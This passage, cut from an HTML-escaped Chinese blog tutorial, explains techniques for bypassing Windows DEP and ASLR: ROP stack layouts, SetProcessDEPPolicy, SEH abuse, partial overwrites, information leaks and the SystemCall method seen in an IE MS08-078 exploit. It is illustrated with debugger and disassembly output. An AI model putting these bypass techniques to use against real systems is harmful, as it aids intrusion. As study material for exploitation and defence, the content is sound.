esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6e c9              leave&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7c93cd6f c20400          ret     4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后的堆栈布局应为：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  AAA……       】  &amp;lt;= 填充数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  push esp/pop ebp/ret    】  &amp;lt;= 调整ebp为可写地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  al=1地址      】  &amp;lt;= 返回地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xffffffff      】  &amp;lt;= 平衡堆栈 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【LdrpCheckNXCompatibility指令地址】  &amp;lt;= 指令cmp al,0x1 的起始地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xffffffff      】  &amp;lt;= 平衡堆栈 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  &amp;quot;A&amp;quot; x 54      】  &amp;lt;= 调整NX禁用后的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  call/jmp esp      】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  shellcode     】    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果在禁用NX后，又需要读取esi或ebp，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如push esp/pop esi/ret或者push esp/pop ebp/ret这样的指令来调整esi和ebp，以使关闭DEP后还能够正常执行。&lt;br&gt;辅助工具：ImmDbg pycommand插件（!pvefindaddr depxpsp3  + !findantidep）&lt;/p&gt;
&lt;h4 id=&quot;4-利用SetProcessDEPPolicy来关闭DEP&quot;&gt;&lt;a href=&quot;#4-利用SetProcessDEPPolicy来关闭DEP&quot; class=&quot;headerlink&quot; title=&quot;4.利用SetProcessDEPPolicy来关闭DEP&quot;&gt;&lt;/a&gt;4.利用SetProcessDEPPolicy来关闭DEP&lt;/h4&gt;&lt;p&gt;适用在：Windows XP SP3，Vista SP1 和Windows 2008。&lt;br&gt;为了能使这个函数有效，当前的DEP 策略必须设成OptIn 或者OptOut。如果策略被设成&lt;br&gt;AlwaysOn（或者AlwaysOff），然后SetProcessDEPPolicy 将会抛出一个错误。如果一个模块&lt;br&gt;是以/NXCOMPAT 链接的，这个技术也将不会成功。最后，同等重要的是，它这能被进程调&lt;br&gt;用一次。因此如果这个函数已经被当前进程调用（如IE8，当程序开始时已经调用它），它&lt;br&gt;将不成功。&lt;br&gt;Bernardo Damele 写了一篇关于这一技术的博文&lt;a href=&quot;http://bernardodamele.blogspot.com/2009/12/dep-bypass-with-setprocessdeppolicy.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《DEP bypass with SetProcessDEPPolicy()》&lt;/a&gt;&lt;br&gt;函数原型如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;BOOLWINAPI &lt;span class=&quot;title&quot;&gt;SetprocessDEPPolicy&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        __in DWORD dwFlags&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;DWORD dwDWORD dw这个函数需要一个参数，并且这个参数必须设置为0，以此禁用当前进程的DEP。&lt;br&gt;为了在ROP 链中使用这个函数，你需要在栈上这样设置：&lt;br&gt;●指向SetProcessDEPPolicy 的指针&lt;br&gt;●指向shellcode 的指针&lt;br&gt;●0&lt;br&gt;指向shellcode 的指针用于确保当SetProcessDEPPolicy()执行完ROP链后会跳到shellcode。&lt;br&gt;在XP SP3 下SetProcessDEPPolicy 的地址是7C8622A4（kernel32.dll）&lt;/p&gt;
&lt;h4 id=&quot;5-利用WPN与ROP技术&quot;&gt;&lt;a href=&quot;#5-利用WPN与ROP技术&quot; class=&quot;headerlink&quot; title=&quot;5.利用WPN与ROP技术&quot;&gt;&lt;/a&gt;5.利用WPN与ROP技术&lt;/h4&gt;&lt;p&gt;ROP（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。&lt;br&gt;WPM（Write Process Memory）：利用微软在kernel32.dll中定义的函数比如：WriteProcess Memory函数可将数据写入到指定进程的内存中。但整个内存区域必须是可访问的，否则将操作失败。&lt;br&gt;具体实现方法参见我之前翻译的文章《利用WPN与ROP技术绕过DEP》：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=119300&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=119300&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-利用SEH-绕过DEP&quot;&gt;&lt;a href=&quot;#6-利用SEH-绕过DEP&quot; class=&quot;headerlink&quot; title=&quot;6.利用SEH 绕过DEP&quot;&gt;&lt;/a&gt;6.利用SEH 绕过DEP&lt;/h4&gt;&lt;p&gt;启用DEP后，就不能使用pop pop ret地址了，而应采用pop reg/pop reg/pop esp/ret 指令的地址，指令pop esp 可以改变堆栈指针，ret将执行流转移到nseh 中的地址上（用关闭NX 例程的地址覆盖nseh，用指向pop/pop/pop esp/ret 指令的指针覆盖异常处理器）。&lt;br&gt;辅助工具：ImmDbg插件!pvefindaddr&lt;/p&gt;
&lt;h2 id=&quot;四、ASLR&quot;&gt;&lt;a href=&quot;#四、ASLR&quot; class=&quot;headerlink&quot; title=&quot;四、ASLR&quot;&gt;&lt;/a&gt;四、ASLR&lt;/h2&gt;&lt;h3 id=&quot;原理-5&quot;&gt;&lt;a href=&quot;#原理-5&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;ASLR（地址空间布局随机化）技术的主要功能是通过对系统关键地址的随机化，防止攻击者在堆栈溢出后利用固定的地址定位到恶意代码并加以运行。它主要对以下四类地址进行随机化：&lt;br&gt;(1)堆地址的随机化；&lt;br&gt;(2)栈基址的随机化；&lt;br&gt;(3)PE文件映像基址的随机化；&lt;br&gt;(4)PEB(Process Environment Block，进程环境块)地址的随机化。&lt;br&gt;它在vista,windows 2008 server,windows7下是默认启用的（IE7除外），非系统镜像也可以通过链接选项/DYNAMICBASE(Visual Studio 2005 SP1 以上的版本，VS2008 都支持)启用这种保护,也可手动更改已编译库的dynamicbase 位，使其支持ASLR 技术(把PE 头中的DllCharacteristics 设置成0x40 -可以&lt;br&gt;使用工具PE EXPLORER 打开库，查看DllCharacteristics 是否包含0x40 就可以知道是否支持ASLR 技术)。另外，也可以使用Process Explorer来查看是否开启ASLR。启用ASLR后，即使你原先已经成功构造出exploit，但在系统重启后，你在exploit中使用的一些固定地址就会被改变，进而导致exploit失效。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-3&quot;&gt;&lt;a href=&quot;#绕过方法：-3&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-覆盖部分返回地址&quot;&gt;&lt;a href=&quot;#1-覆盖部分返回地址&quot; class=&quot;headerlink&quot; title=&quot;1.覆盖部分返回地址&quot;&gt;&lt;/a&gt;1.覆盖部分返回地址&lt;/h4&gt;&lt;p&gt;对比下windows7系统启动前后OD中loaddll.exe的各模块基址，启动前：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;可执行模块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;基址       大小       入口       名称       文件版本          路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00400000   00060000   00410070   loaddll                      D:\riusksk\TOOL\Ollydbg\loaddll.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6DDE0000   0008C000   6DDE1FFF   AcLayers   6.1.7600.16385 (  C:\Windows\AppPatch\AcLayers.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;710E0000   00012000   710E1200   mpr        6.1.7600.16385 (  C:\Windows\System32\mpr.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71C50000   00051000   71C79834   winspool   6.1.7600.16385 (  C:\Windows\System32\winspool.drv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;747F0000   00017000   747F1C89   userenv    6.1.7600.16385 (  C:\Windows\System32\userenv.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;750A0000   0001A000   750A2CCD   sspicli    6.1.7600.16385 (  C:\Windows\System32\sspicli.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;750C0000   0004B000   750C2B6C   apphelp    6.1.7600.16385 (  C:\Windows\System32\apphelp.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75190000   0000B000   75191992   profapi    6.1.7600.16385 (  C:\Windows\System32\profapi.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75420000   0004A000   75427A9D   KERNELBA   6.1.7600.16385 (  C:\Windows\system32\KERNELBASE.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75B50000   0000A000   75B5136C   LPK        6.1.7600.16385 (  C:\Windows\system32\LPK.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75B60000   0004E000   75B6EC49   GDI32      6.1.7600.16385 (  C:\Windows\system32\GDI32.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;系统重启后：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;可执行模块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;基址       大小       入口       名称       文件版本          路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00400000   00060000   00410070   loaddll                      D:\riusksk\TOOL\Ollydbg\loaddll.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6F510000   0008C000   6F511FFF   AcLayers   6.1.7600.16385 (  C:\Windows\AppPatch\AcLayers.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;715B0000   00012000   715B1200   mpr        6.1.7600.16385 (  C:\Windows\System32\mpr.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72170000   00051000   72199834   winspool   6.1.7600.16385 (  C:\Windows\System32\winspool.drv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74C70000   00017000   74C71C89   userenv    6.1.7600.16385 (  C:\Windows\System32\userenv.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75520000   0001A000   75522CCD   sspicli    6.1.7600.16385 (  C:\Windows\System32\sspicli.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75540000   0004B000   75542B6C   apphelp    6.1.7600.16385 (  C:\Windows\System32\apphelp.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75610000   0000B000   75611992   profapi    6.1.7600.16385 (  C:\Windows\System32\profapi.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75690000   0004A000   75697A9D   KERNELBA   6.1.7600.16385 (  C:\Windows\system32\KERNELBASE.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;759B0000   000CC000   759B168B   msctf      6.1.7600.16385 (  C:\Windows\System32\msctf.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75E60000   000AC000   75E6A472   msvcrt     7.0.7600.16385 (  C:\Windows\system32\msvcrt.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75F10000   0004E000   75F1EC49   GDI32      6.1.7600.16385 (  C:\Windows\system32\GDI32.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此可见，各模块基址的高位是随机变化的，而低位是固定不变的，这里loaddll.exe不受ADSL保护，所以其基址没有随机化，如果是Notepad.exe就有启用ASLR，还有其它经链接选项/DYNAMICBASE编译的程序也会启用ASLR。因此我们可以让填充字符只覆盖到返回地址的一半，由于小端法机器的缘故，其低位地址在前，因此覆盖到的一半地址刚好处于低位，而返回地址的高位我们让它保持不变，所以我们必须在返回地址之前的地址范围内（相当于漏洞函数所在的255字节空间地址）查找出一个可跳转到shellcode的指令，比如jmp edx(关键看哪一寄存器指向shellcode)。除此之外，我们还必须将shellcode放在返回地址之前，不然连返回地址的高位也覆盖掉了，这是不允许的。纵观此法，相当的有局限性，如果漏洞函数过短，可能就没有我们需要的指令了，这时就得另寻他法了。&lt;/p&gt;
&lt;h4 id=&quot;2-利用未启用ASLR的模块地址&quot;&gt;&lt;a href=&quot;#2-利用未启用ASLR的模块地址&quot; class=&quot;headerlink&quot; title=&quot;2.利用未启用ASLR的模块地址&quot;&gt;&lt;/a&gt;2.利用未启用ASLR的模块地址&lt;/h4&gt;&lt;p&gt;这与之前绕过SafeSEH的方法类似，直接在未受ASLR保护的模块中查找跳转指令的地址来覆盖返回地址或者SEH结构，比如上方的可执行模块列表中的loaddll.exe地址就是固定不变，因此我们借助其地址空间中的指令来实现跳板。这个可以通过Process Explorer或者ImmDbg命令插件来查看哪些可执行模块未受ASDL保护!ASLRdynamicbase或者(!pvefindaddr noaslr)：来查看哪些进程模块启用ASLR保护。&lt;/p&gt;
&lt;h4 id=&quot;3-heap-spary&quot;&gt;&lt;a href=&quot;#3-heap-spary&quot; class=&quot;headerlink&quot; title=&quot;3.heap spary&quot;&gt;&lt;/a&gt;3.heap spary&lt;/h4&gt;&lt;p&gt;具体利用方法同上，这里不再赘述。&lt;/p&gt;
&lt;h4 id=&quot;4-利用内存信息泄漏&quot;&gt;&lt;a href=&quot;#4-利用内存信息泄漏&quot; class=&quot;headerlink&quot; title=&quot;4.利用内存信息泄漏&quot;&gt;&lt;/a&gt;4.利用内存信息泄漏&lt;/h4&gt;&lt;p&gt;通过获取内存中某些有用的信息，或者关于目标进程的状态信息，攻击者通过一个可用的指针就有可能绕过ASLR。这种方法还是十分有效的，主要原因如下：&lt;br&gt;（1）可利用指针检测对象在内存中的映射地址。比如栈指针指向内存中某线程的栈空间地址，或者一静态变量指针可泄露出某一特定DLL/EXE的基址。&lt;br&gt;（2）通过指针推断出其他附加信息。比如栈桢中的桢指针不仅提供了某线程栈空间地址，而且提供了栈桢中的相关函数，并可通过此指针获得前后栈桢的相关信息。再比如一个数据段指针，通过它可以获得其在内存中的映像地址，以及单数据元素地址。若是堆指针还可获得已分配的数据块地址，这些信息在程序攻击中还是着为有用的。&lt;br&gt;在Vista系统的ASLR中，信息泄漏的可用性更广了。如果攻击者知道内存中某一映射地址，那么他不仅可获取对应进程中的DLL地址，连系统中运行的所有进程也会遭殃。因为其他进程在重新加载同一DLL时，是通过特定地址上的_MiImageBitMap变量来搜索内存中的DLL地址的，而这一bitmap又被用于所有进程，因此找到一进程中某DLL的地址，即可在所有进程的地址空间中定位出该DLL地址。&lt;/p&gt;
&lt;h4 id=&quot;5-利用SystemCall&quot;&gt;&lt;a href=&quot;#5-利用SystemCall&quot; class=&quot;headerlink&quot; title=&quot;5.利用SystemCall&quot;&gt;&lt;/a&gt;5.利用SystemCall&lt;/h4&gt;&lt;p&gt;（1）在SystemCall 地址0x7ffe0300上是没有被随机化的，下面是我在win7 中文旗舰版上的情况：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; dt _KUSER_SHARED_DATA 0x7ffe0000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!_KUSER_SHARED_DATA&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;…&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   +0x300 SystemCall       : 0x77966340&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   +0x304 SystemCallReturn : 0x77966344&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 77966340&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!KiFastSystemCall:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77966340 8bd4            mov     edx,esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77966342 0f34            sysenter&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）– Windows 用户模式进入内核模式时：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u ZwCreateProcess&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtCreateProcess:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77964940 b84f000000      mov     eax,4Fh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77964945 ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7796494a ff12            call    dword ptr [edx]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7796494c c22000          ret     20h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;– 通过手工构造System Call的参数&lt;br&gt;– 并且用System Call的技术来绕过DEP&amp;amp;ALSR&lt;/p&gt;
&lt;p&gt;（3）IE MS08-078 exploit with SystemCall on windows&lt;br&gt;– 通过堆喷射的方法在内存中填充SystemCall的地址&lt;br&gt;– 在exploit中使用SystemCall地址&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D30 mov eax, [esi] //eax==0x0a0a11c8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ….        // 0x11c8 be a systemcall ID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4C mov ecx, [eax]   //[0x0a0a11c8]==0x7ffe027c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4E push edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4F push eax   //eax==0x0a0a11c8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D50 call dword ptr [ecx+84h] //call [0x7FFE0300] SystemCall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上代码等同于调用NtUserLockWorkStation&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov eax,11c8h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov edx,offset SharedUserData!SystemCallStub (7ffe0300)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr [edx]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（4）System call on x64&lt;br&gt;– 7ffe0300 不再存放KiFastSystemCall的地址&lt;br&gt;– 通过call dword ptr fs:[0C0h]指令来代替系统调用的方法&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u NtQueryInformationToken&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtQueryInformationToken:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb38 b81e000000 mov eax,1Eh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb3d 33c9 xor ecx,ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb3f 8d542404 lea edx,[esp+4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb43 64ff15c0000000 call dword ptr fs:[0C0h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb4a 83c404 add 